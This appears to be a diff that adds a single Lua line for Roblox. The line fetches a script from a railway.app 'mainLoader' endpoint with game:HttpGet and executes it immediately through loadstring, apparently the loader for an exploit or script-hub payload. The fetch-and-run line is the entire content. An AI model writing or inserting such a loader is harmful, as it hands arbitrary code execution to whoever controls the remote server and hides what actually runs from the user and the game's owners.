@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://galactic-protect.up.railway.app/api/mainLoader'))()
